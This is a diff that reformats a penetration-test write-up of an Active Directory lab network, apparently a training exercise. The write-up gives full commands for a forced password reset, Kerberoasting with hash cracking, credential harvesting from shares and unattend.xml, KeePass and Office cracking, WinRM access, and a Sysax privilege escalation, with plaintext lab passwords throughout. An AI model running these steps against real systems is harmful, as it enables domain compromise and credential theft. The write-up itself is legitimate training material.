@@ -1271,22 +1271,17 @@ INFO: Compressing output into 20261113132230_bloodhound.zip
 ```
 
 ---
-
 ## ForceChangePassword
 
 Analysis of the collected data shows `hporter` holds `ForceChangePassword` over `ssmalls`:
 
-./bh/1.png
+![](./bh/1.png)
 
 The right is used to reset the password without knowing the current one:
-
-bash
 
 ```bash
 net rpc password "ssmalls" 'Password123!' -U "INLANEFREIGHT.LOCAL"/"hporter"%'Gr8hambino!' -S DC01
 ```
-
-bash
 
 ```bash
 nxc smb 172.16.8.3 -u 'ssmalls' -p 'Password123!' --shares
@@ -1308,7 +1303,6 @@ SMB         172.16.8.3      445    DC01             SYSVOL          READ        
 
 `ssmalls` is used to request service tickets for every SPN account in the domain:
 
-bash
 
 ```bash
 impacket-GetUserSPNs INLANEFREIGHT.LOCAL/ssmalls -dc-ip 172.16.8.3 -request -outputfile spn.hash
@@ -1333,8 +1327,6 @@ vmware/vc.inlanefreight.local                vmwarescvc              2022-06-01 
 
 Only the `backupjob` ticket cracks against `rockyou.txt`:
 
-bash
-
 ```bash
 hashcat -m 13100 spn.hash /usr/share/wordlists/rockyou.txt
 ```
@@ -1342,8 +1334,6 @@ hashcat -m 13100 spn.hash /usr/share/wordlists/rockyou.txt
 ```
 $krb5tgs$23$*backupjob$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/backupjob*$...:lucky7
 ```
-
-bash
 
 ```bash
 nxc smb 172.16.8.3 -u backupjob -p lucky7
@@ -1357,12 +1347,10 @@ SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\back
 This account grants no further access and is not pursued.
 
 ---
-
-## SMB Share Enumeration — IT Department Shares
+## SMB Share Enumeration
 
 `ssmalls` is a member of an IT admin group, so the shares are enumerated again with this account:
 
-bash
 
 ```bash
 smbmap -u ssmalls -p Password123! -H 172.16.8.3 -r 'Department Shares' --depth 5
@@ -1386,7 +1374,6 @@ smbmap -u ssmalls -p Password123! -H 172.16.8.3 -r 'Department Shares' --depth 5
         fr--r--r--             4001 Wed Jun  1 14:35:16 2022    SQL Express Backup.ps1
 ```
 
-bash
 
 ```bash
 smbclient -U ssmalls "//172.16.8.3/Department Shares" --password='Password123!'
@@ -1400,8 +1387,6 @@ getting file \IT\Private\Development\SQL Express Backup.ps1 of size 4001 as SQL 
 
 The script contains hardcoded SQL credentials for a `backupadm` account:
 
-powershell
-
 ```powershell
 $serverName = ".\SQLExpress"
 $mySrvConn = new-object Microsoft.SqlServer.Management.Common.ServerConnection
@@ -1410,8 +1395,6 @@ $mySrvConn.LoginSecure = $false
 $mySrvConn.Login = "backupadm"
 $mySrvConn.Password = "!qazXSW@"
 ```
-
-bash
 
 ```bash
 nxc smb 172.16.8.3 -u backupadm -p '!qazXSW@'
@@ -1424,11 +1407,10 @@ SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\back
 
 ---
 
-## MS01 (172.16.8.50) — WinRM Access as backupadm
+## MS01 (172.16.8.50)
 
 The recovered credentials are valid for WinRM across the domain, including `ACADEMY-AEN-MS0`:
 
-bash
 
 ```bash
 nxc winrm 172.16.8.0/24 -u backupadm -p '!qazXSW@'
@@ -1442,8 +1424,6 @@ WINRM       172.16.8.3      5985   DC01             [-] INLANEFREIGHT.LOCAL\back
 WINRM       172.16.8.20     5985   ACADEMY-AEN-DEV  [-] INLANEFREIGHT.LOCAL\backupadm:!qazXSW@
 WINRM       172.16.8.50     5985   ACADEMY-AEN-MS0  [+] INLANEFREIGHT.LOCAL\backupadm:!qazXSW@ (Pwn3d!)
 ```
-
-bash
 
 ```bash
 evil-winrm -i 172.16.8.50 -u backupadm -p '!qazXSW@'
@@ -1469,18 +1449,14 @@ d-r---       11/14/2026  11:54 AM                Users
 
 ---
 
-## Credential Harvesting on MS01 — KeePass & Excel
+## Credential Harvesting on MS01 
 
 Both files are downloaded and converted into crackable hash formats:
-
-bash
 
 ```bash
 *Evil-WinRM* PS C:\> download budget_data.xlsx
 *Evil-WinRM* PS C:\> download Inlanefreight.kdbx
 ```
-
-bash
 
 ```bash
 keepass2john Inlanefreight.kdbx > Inlanefreight.hash
@@ -1493,7 +1469,6 @@ Welcome1         (Inlanefreight)
 1g 0:00:02:20 DONE (2026-11-14 13:05) 0.007139g/s 288.4p/s
 ```
 
-bash
 
 ```bash
 file budget_data.xlsx
@@ -1502,8 +1477,6 @@ file budget_data.xlsx
 ```
 budget_data.xlsx: CDFV2 Encrypted
 ```
-
-bash
 
 ```bash
 office2john budget_data.xlsx > budget_data.hash
@@ -1518,9 +1491,9 @@ lucky7           (budget_data.xlsx)
 
 Opening both files confirms their content, but neither discloses anything useful for further access:
 
-./ms01/1.png
+![](./ms01/1.png)
 
-./ms01/2.png
+.![](./ms01/2.png)
 
 ---
 
@@ -1528,7 +1501,6 @@ Opening both files confirms their content, but neither discloses anything useful
 
 The `unattend.xml` file found under `C:\panther` discloses local credentials for `ilfserveradm`:
 
-xml
 
 ```xml
 <AutoLogon>
@@ -1546,8 +1518,6 @@ xml
 
 `ilfserveradm:Sys26Admin` is confirmed to be a member of **Remote Desktop Users**:
 
-bash
-
 ```bash
 *Evil-WinRM* PS C:\Users\backupadm\Documents> net user ilfserveradm
 ```
@@ -1561,19 +1531,17 @@ Local Group Memberships      *Remote Desktop Users
 Global Group memberships     *None
 ```
 
-bash
-
 ```bash
 xfreerdp3 /u:ilfserveradm /p:Sys26Admin /v:172.16.8.50 /drive:share,/home/kali/tools
 ```
 
 ---
 
-## Privilege Escalation on MS01 — Sysax Automation
+## Privilege Escalation on MS01
 
 `Program Files (x86)` contains a Sysax Automation installation:
 
-./ms01/3.png
+![](./ms01/3.png)
 
 The product is vulnerable to local privilege escalation through its triggered-task feature ([PoC reference](https://www.exploit-db.com/exploits/50834)):
 
@@ -1597,15 +1565,15 @@ The product is vulnerable to local privilege escalation through its triggered-ta
 
 `pwn.bat` is written to the Desktop, pointing to a local netcat listener:
 
-./ms01/4.png
+![](./ms01/4.png)
 
 A triggered task is configured in `sysaxschedscp.exe`:
 
-./ms01/5.png
+![](./ms01/5.png)
 
 The task monitors the Desktop folder and fires when a file is added to it:
 
-./ms01/6.png
+![](./ms01/6.png)
 
 It is set to run `pwn.bat` as "any other program", with the "Login as the following user" option left unchecked, so it runs in the scheduler service's own privileged context:
 
